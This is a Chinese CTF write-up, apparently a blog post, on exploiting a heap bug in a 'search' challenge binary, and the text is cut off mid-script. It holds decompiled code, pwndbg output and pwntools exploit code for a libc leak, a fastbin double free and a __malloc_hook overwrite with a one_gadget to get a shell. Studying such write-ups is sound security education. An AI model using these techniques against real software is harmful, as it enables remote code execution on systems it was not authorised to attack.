class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">do_search</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> word_sz; <span class="comment">// ebp</span></span><br><span class="line">  <span class="keyword">void</span> *word_ptr; <span class="comment">// r12</span></span><br><span class="line">  __int64 i; <span class="comment">// rbx</span></span><br><span class="line">  <span class="keyword">char</span> v3; <span class="comment">// [rsp+0h] [rbp-38h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Enter the word size:"</span>);</span><br><span class="line">  word_sz = get_num();</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)(word_sz - <span class="number">1</span>) &gt; <span class="number">0xFFFD</span> )</span><br><span class="line">    do_put(<span class="string">"Invalid size"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Enter the word:"</span>);</span><br><span class="line">  word_ptr = <span class="built_in">malloc</span>(word_sz);</span><br><span class="line">  read_str((__int64)word_ptr, word_sz, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">for</span> ( i = qword_6020B8; i; i = *(_QWORD *)(i + <span class="number">32</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( **(_BYTE **)(i + <span class="number">16</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( *(_DWORD *)(i + <span class="number">8</span>) == word_sz &amp;&amp; !<span class="built_in">memcmp</span>(*(<span class="keyword">const</span> <span class="keyword">void</span> **)i, word_ptr, word_sz) )</span><br><span class="line">      &#123;</span><br><span class="line">        __printf_chk(<span class="number">1L</span>L, <span class="string">"Found %d: "</span>, *(<span class="keyword">unsigned</span> <span class="keyword">int</span> *)(i + <span class="number">24</span>));</span><br><span class="line">        fwrite(*(<span class="keyword">const</span> <span class="keyword">void</span> **)(i + <span class="number">16</span>), <span class="number">1u</span>LL, *(<span class="keyword">signed</span> <span class="keyword">int</span> *)(i + <span class="number">24</span>), <span class="built_in">stdout</span>);</span><br><span class="line">        <span class="built_in">putchar</span>(<span class="number">10</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"Delete this sentence (y/n)?"</span>);</span><br><span class="line">        read_str((__int64)&amp;v3, <span class="number">2</span>, <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">if</span> ( v3 == <span class="number">121</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">memset</span>(*(<span class="keyword">void</span> **)(i + <span class="number">16</span>), <span class="number">0</span>, *(<span class="keyword">signed</span> <span class="keyword">int</span> *)(i + <span class="number">24</span>));</span><br><span class="line">          <span class="built_in">free</span>(*(<span class="keyword">void</span> **)(i + <span class="number">16</span>)); <span class="comment">// 这里也没有设为 NULL</span></span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">"Deleted!"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">free</span>(word_ptr);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以大致分析出 Word 结构体的模样，一个链表：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Word</span> &#123;</span></span><br><span class="line">    <span class="keyword">char</span>* word_ptr;         <span class="comment">// i</span></span><br><span class="line">    <span class="keyword">int</span> word_sz;            <span class="comment">// i + 8</span></span><br><span class="line">    <span class="keyword">char</span>* sen_ptr;          <span class="comment">// i + 16</span></span><br><span class="line">    <span class="keyword">int</span> sen_sz;             <span class="comment">// i + 24</span></span><br><span class="line">    Word* prev;             <span class="comment">// i + 32</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>在 IDA 中还原一下，切到 Structrues，Edit-&gt;Add struct type，然后在 ends 摁 d，添加成员调整大小，再摁 n 改名。（我知道有内存对齐，int 不是 4 字节，但是懒得写了）</p><figure class="highlight as"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00000000</span> Word            struc ; (sizeof=<span class="number">0x28</span>, mappedto_7)</span><br><span class="line"><span class="number">00000000</span> word_ptr        dq ?</span><br><span class="line"><span class="number">00000008</span> word_sz         dq ?</span><br><span class="line"><span class="number">00000010</span> sen_ptr         dq ?</span><br><span class="line"><span class="number">00000018</span> sen_sz          dq ?</span><br><span class="line"><span class="number">00000020</span> prev            dq ?</span><br><span class="line"><span class="number">00000028</span> Word            ends</span><br></pre></td></tr></table></figure><p>所以上面代码就变成了这样，应该就可以看懂了。（IDA 牛逼！）</p><p>下面这个函数是输入一个句子，然后把词分出来，加到链表里。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">do_index</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> sz; <span class="comment">// eax</span></span><br><span class="line">  __int64 sz_1; <span class="comment">// rbp</span></span><br><span class="line">  <span class="keyword">int</span> sen_sz; <span class="comment">// er13</span></span><br><span class="line">  <span class="keyword">char</span> *sen_ptr; <span class="comment">// r12</span></span><br><span class="line">  <span class="keyword">signed</span> __int64 v4; <span class="comment">// rbx</span></span><br><span class="line">  <span class="keyword">signed</span> __int64 v5; <span class="comment">// rbp</span></span><br><span class="line">  Word *new_word; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">int</span> wd_sz; <span class="comment">// edx</span></span><br><span class="line">  __int64 v8; <span class="comment">// rdx</span></span><br><span class="line">  __int64 word_head; <span class="comment">// rdx</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Enter the sentence size:"</span>);</span><br><span class="line">  sz = get_num();</span><br><span class="line">  sz_1 = (<span class="keyword">unsigned</span> <span class="keyword">int</span>)(sz - <span class="number">1</span>);</span><br><span class="line">  sen_sz = sz;</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)sz_1 &gt; <span class="number">0xFFFD</span> )</span><br><span class="line">    do_put(<span class="string">"Invalid size"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Enter the sentence:"</span>);</span><br><span class="line">  sen_ptr = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(sen_sz);</span><br><span class="line">  read_str((__int64)sen_ptr, sen_sz, <span class="number">0</span>);</span><br><span class="line">  v4 = (<span class="keyword">signed</span> __int64)(sen_ptr + <span class="number">1</span>);</span><br><span class="line">  v5 = (<span class="keyword">signed</span> __int64)&amp;sen_ptr[sz_1 + <span class="number">2</span>];</span><br><span class="line">  new_word = (Word *)<span class="built_in">malloc</span>(<span class="number">0x28</span>uLL);</span><br><span class="line">  wd_sz = <span class="number">0</span>;</span><br><span class="line">  new_word-&gt;word_ptr = (__int64)sen_ptr;</span><br><span class="line">  LODWORD(new_word-&gt;word_sz) = <span class="number">0</span>;</span><br><span class="line">  new_word-&gt;sen_ptr = (__int64)sen_ptr;</span><br><span class="line">  LODWORD(new_word-&gt;sen_sz) = sen_sz;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( *(_BYTE *)(v4 - <span class="number">1</span>) != <span class="number">32</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      LODWORD(new_word-&gt;word_sz) = ++wd_sz;</span><br><span class="line">LABEL_4:</span><br><span class="line">      <span class="keyword">if</span> ( ++v4 == v5 )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_8;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( wd_sz )</span><br><span class="line">    &#123;</span><br><span class="line">      word_head = qword_6020B8;</span><br><span class="line">      qword_6020B8 = (__int64)new_word;</span><br><span class="line">      new_word-&gt;prev = word_head;</span><br><span class="line">      new_word = (Word *)<span class="built_in">malloc</span>(<span class="number">0x28</span>uLL);</span><br><span class="line">      wd_sz = <span class="number">0</span>;</span><br><span class="line">      new_word-&gt;word_ptr = v4;</span><br><span class="line">      LODWORD(new_word-&gt;word_sz) = <span class="number">0</span>;</span><br><span class="line">      new_word-&gt;sen_ptr = (__int64)sen_ptr;</span><br><span class="line">      LODWORD(new_word-&gt;sen_sz) = sen_sz;</span><br><span class="line">      <span class="keyword">goto</span> LABEL_4;</span><br><span class="line">    &#125;</span><br><span class="line">    new_word-&gt;word_ptr = v4++;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( v4 != v5 );</span><br><span class="line">LABEL_8:</span><br><span class="line">  <span class="keyword">if</span> ( wd_sz )</span><br><span class="line">  &#123;</span><br><span class="line">    v8 = qword_6020B8;</span><br><span class="line">    qword_6020B8 = (__int64)new_word;</span><br><span class="line">    new_word-&gt;prev = v8;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">free</span>(new_word);  <span class="comment">// 没有设为 NULL</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">"Added sentence"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="漏洞点"><a href="#漏洞点" class="headerlink" title="漏洞点"></a>漏洞点</h2><p>在读字符串的函数里，由于传入的 flag 永远是 0，所以没有结尾 NULL：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> __<span class="function">fastcall <span class="title">read_str</span><span class="params">(__int64 res, <span class="keyword">int</span> len, <span class="keyword">int</span> bool_flag)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> flag; <span class="comment">// er14</span></span><br><span class="line">  <span class="keyword">int</span> idx; <span class="comment">// ebx</span></span><br><span class="line">  _BYTE *tmp_ptr; <span class="comment">// rbp</span></span><br><span class="line">  <span class="keyword">int</span> tmp_len; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( len &lt;= <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    idx = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    flag = bool_flag;</span><br><span class="line">    idx = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      tmp_ptr = (_BYTE *)(res + idx);</span><br><span class="line">      tmp_len = fread((<span class="keyword">void</span> *)(res + idx), <span class="number">1u</span>LL, <span class="number">1u</span>LL, <span class="built_in">stdin</span>);</span><br><span class="line">      <span class="keyword">if</span> ( tmp_len &lt;= <span class="number">0</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">if</span> ( *tmp_ptr == <span class="string">'\n'</span> &amp;&amp; flag ) <span class="comment">// 永远为 false</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( idx )</span><br><span class="line">        &#123;</span><br><span class="line">          *tmp_ptr = <span class="number">0</span>;</span><br><span class="line">          <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        idx = tmp_len - <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span> ( len &lt;= tmp_len - <span class="number">1</span> )</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        idx += tmp_len;</span><br><span class="line">        <span class="keyword">if</span> ( len &lt;= idx )</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( idx != len )</span><br><span class="line">    do_put(<span class="string">"Not enough data"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>读 number 的时候，也没有将 str 设为 null，所以读取内容不合法的时候，可以泄露：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">__<span class="function">int64 <span class="title">get_num</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">char</span> *endptr; <span class="comment">// [rsp+8h] [rbp-50h]</span></span><br><span class="line">  <span class="keyword">char</span> nptr; <span class="comment">// [rsp+10h] [rbp-48h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v3; <span class="comment">// [rsp+48h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  read_str((__int64)&amp;nptr, <span class="number">48</span>, <span class="number">1</span>);</span><br><span class="line">  result = strtol(&amp;nptr, &amp;endptr, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> ( endptr == &amp;nptr )</span><br><span class="line">  &#123;</span><br><span class="line">    __printf_chk(<span class="number">1L</span>L, <span class="string">"%s is not a valid number\n"</span>, &amp;nptr);</span><br><span class="line">    result = get_num();</span><br><span class="line">  &#125;</span><br><span class="line">  __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><h3 id="基本思路如下"><a href="#基本思路如下" class="headerlink" title="基本思路如下"></a>基本思路如下</h3><ol><li>利用 unsorted bin 地址泄漏 libc 基地址</li><li>利用 double free 构造 fastbin 循环链表</li><li>分配 chunk 到 malloc_hook 附近，修改 malloc_hook 为 one_gadget</li></ol><h3 id="泄露-libc"><a href="#泄露-libc" class="headerlink" title="泄露 libc"></a>泄露 libc</h3><p>这里分配一个 small bin 大小的 chunk ，当它被释放后，就会放入到 unsorted bin 中。因而，只要 unsorted bin 的地址的起始字节不是 \x00 便可以通过验证。同时，可以构造 \x00 来进行比较，从而通过验证：</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak_libc</span><span class="params">()</span>:</span></span><br><span class="line">    smallbin_sentence = <span class="string">'a'</span> * <span class="number">0x85</span> + <span class="string">' b '</span></span><br><span class="line">    index_sentence(smallbin_sentence)</span><br><span class="line">    search_word(<span class="string">'b'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Delete this sentence (y/n)?\n'</span>)</span><br><span class="line">    p.sendline(<span class="string">'y'</span>)</span><br><span class="line">    search_word(<span class="string">'\x00'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Found '</span> + str(len(smallbin_sentence)) + <span class="string">': '</span>)</span><br><span class="line">    unsortedbin_addr = u64(p.recv(<span class="number">8</span>))</span><br><span class="line">    p.recvuntil(<span class="string">'Delete this sentence (y/n)?\n'</span>)</span><br><span class="line">    p.sendline(<span class="string">'n'</span>)</span><br><span class="line">    <span class="keyword">return</span> unsortedbin_addr</span><br></pre></td></tr></table></figure><h3 id="构造-fastbin-循环链表"><a href="#构造-fastbin-循环链表" class="headerlink" title="构造 fastbin 循环链表"></a>构造 fastbin 循环链表</h3><p>由于最后希望在 malloc_hook 处分配 chunk，而一般分配 malloc_hook 附近的 chunk 一般大小都是 0x7f。即，所需要设置的 fast bin 的数据字节部分的大小为 0x60。这里按照如下方式构造:</p><ol><li>分别索引句子 a，索引句子 b，索引句子 c，则此时单词链表中索引的句子的相对顺序为 c-&gt;b-&gt;a。假设句子 a 为<code>&#39;a&#39; * 0x5d + &#39;d&#39;</code>，句子 b 为<code>&#39;b&#39; * 0x5d + &#39;d&#39;</code>，句子 c 类似。</li><li>索引单词 d，三个均删除，则此时 fastbin 中的链表情况为 a-&gt;b-&gt;c-&gt;NULL，这是因为首先释放的是句子 c，最后释放的是句子 a。这时，搜索单词时 *i-&gt;sentence_ptr 对于 a, b 来说都是可以绕过的。</li><li>此时再次删除搜索单词 \x00。首先遍历的是 c，但是 c 的验证不通过；其次遍历的是 b，验证通过，将其释放；其次遍历的是 a，验证通过，但是不删除。则此时 fastbin 的情况为 b-&gt;a-&gt;b-&gt;a-&gt;…。即已经构成了 double free b 的情况。由于先前为了 leak libc 还建立一个句子，所以还有一个单词可以比较，这里也不删除。</li></ol><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 2. create cycle fastbin 0x70 size</span></span><br><span class="line">index_sentence(<span class="string">'a'</span> * <span class="number">0x5d</span> + <span class="string">' d '</span>)  <span class="comment">#a</span></span><br><span class="line">index_sentence(<span class="string">'b'</span> * <span class="number">0x5d</span> + <span class="string">' d '</span>)  <span class="comment">#b</span></span><br><span class="line">index_sentence(<span class="string">'c'</span> * <span class="number">0x5d</span> + <span class="string">' d '</span>)  <span class="comment">#c</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># a-&gt;b-&gt;c-&gt;NULL</span></span><br><span class="line">search_word(<span class="string">'d'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Delete this sentence (y/n)?\n'</span>)</span><br><span class="line">p.sendline(<span class="string">'y'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Delete this sentence (y/n)?\n'</span>)</span><br><span class="line">p.sendline(<span class="string">'y'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Delete this sentence (y/n)?\n'</span>)</span><br><span class="line">p.sendline(<span class="string">'y'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># b-&gt;a-&gt;b-&gt;a-&gt;...</span></span><br><span class="line">search_word(<span class="string">'\x00'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Delete this sentence (y/n)?\n'</span>)</span><br><span class="line">p.sendline(<span class="string">'y'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Delete this sentence (y/n)?\n'</span>)</span><br><span class="line">p.sendline(<span class="string">'n'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Delete this sentence (y/n)?\n'</span>)</span><br><span class="line">p.sendline(<span class="string">'n'</span>)</span><br></pre></td></tr></table></figure><h3 id="分配-malloc-hook-附近-chunk"><a href="#分配-malloc-hook-附近-chunk" class="headerlink" title="分配 malloc_hook 附近 chunk"></a>分配 malloc_hook 附近 chunk</h3><p>此时，fastbin 的链表为 b-&gt;a-&gt;b-&gt;a-&gt;…，则可以在申请第一个相同大小的 chunk 时，设置 b 的 fd 为 malloc_hook 附近处的 chunk 0x7fd798586aed。</p><p>（find_fake_fast 是真的骚，可惜环境弄坏现在还没弄好）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; <span class="built_in">print</span> (void*)&amp;main_arena</span><br><span class="line"><span class="variable">$1</span> = (void *) 0x7fd798586b20 &lt;main_arena&gt;</span><br><span class="line">pwndbg&gt; x/8gx 0x7fd798586b20-16</span><br><span class="line">0x7fd798586b10 &lt;__malloc_hook&gt;: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x7fd798586b20 &lt;main_arena&gt;:    0x0000000000000000  0x0000000000bce130</span><br><span class="line">0x7fd798586b30 &lt;main_arena+16&gt;: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x7fd798586b40 &lt;main_arena+32&gt;: 0x0000000000000000  0x0000000000000000</span><br><span class="line">pwndbg&gt; find_fake_fast 0x7fd798586b10 0x7f</span><br><span class="line">FAKE CHUNKS</span><br><span class="line">0x7fd798586aed PREV_INUSE IS_MMAPED NON_MAIN_ARENA &#123;</span><br><span class="line">  prev_size = 15535264025435701248,</span><br><span class="line">  size = 127,</span><br><span class="line">  fd = 0xd798247e20000000,</span><br><span class="line">  bk = 0xd798247a0000007f,</span><br><span class="line">  fd_nextsize = 0x7f,</span><br><span class="line">  bk_nextsize = 0x0</span><br><span class="line">&#125;</span><br><span class="line">pwndbg&gt; <span class="built_in">print</span> /x 0x7fd798586b10-0x7fd798586aed</span><br><span class="line"><span class="variable">$2</span> = 0x23</span><br><span class="line">pwndbg&gt; <span class="built_in">print</span> /x 0x7fd798586b20-0x7fd798586aed</span><br><span class="line"><span class="variable">$3</span> = 0x33</span><br></pre></td></tr></table></figure><p>那么当再次分配 b 的时候，由于此时 b 的 fd 已经被修改为了 malloc_hook 附近的地址，所以这时候再次分配一个 chunk，就会指向 0x7fd798586aed。 此后便只需要将 malloc_hook 修改为 libc 里这段骚东西就行了。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.text:00000000000F02A4                 mov     rax, cs:environ_ptr_0</span><br><span class="line">.text:00000000000F02AB                 lea     rsi, [rsp+1B8h+var_168]</span><br><span class="line">.text:00000000000F02B0                 lea     rdi, aBinSh     ; &quot;/bin/sh&quot;</span><br><span class="line">.text:00000000000F02B7                 mov     rdx, [rax]</span><br><span class="line">.text:00000000000F02BA                 call    execve</span><br></pre></td></tr></table></figure><h2 id="完整-exp"><a href="#完整-exp" class="headerlink" title="完整 exp"></a>完整 exp</h2><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.update(log_level=<span class="string">'debug'</span>)</span><br><span class="line">context.binary = <span class="string">"./search"</span></span><br><span class="line">search = context.binary</span><br><span class="line">p = process(<span class="string">'./search'</span>)</span><br><span class="line">e = ELF(<span class="string">'./search'</span>)</span><br><span class="line">l = ELF(<span class="string">'./libc.so.6'</span>)</span><br><span class="line"></span><br><span class="line">main_arena_offset = <span class="number">0x3c4b20</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">offset_bin_main_arena</span><span class="params">(idx)</span>:</span></span><br><span class="line">    word_bytes = context.word_size / <span class="number">8</span></span><br><span class="line">    offset = <span class="number">4</span>                      <span class="comment"># lock</span></span><br><span class="line">    offset += <span class="number">4</span>                     <span class="comment"># flags</span></span><br><span class="line">    offset += word_bytes * <span class="number">10</span>       <span class="comment"># offset fastbin</span></span><br><span class="line">    offset += word_bytes * <span class="number">2</span>        <span class="comment"># top,last_remainder</span></span><br><span class="line">    offset += idx * <span class="number">2</span> * word_bytes  <span class="comment"># idx</span></span><br><span class="line">    offset -= word_bytes * <span class="number">2</span>        <span class="comment"># bin overlap</span></span><br><span class="line">    <span class="keyword">return</span> offset</span><br><span class="line"></span><br><span class="line">unsortedbin_offset_main_arena = offset_bin_main_arena(<span 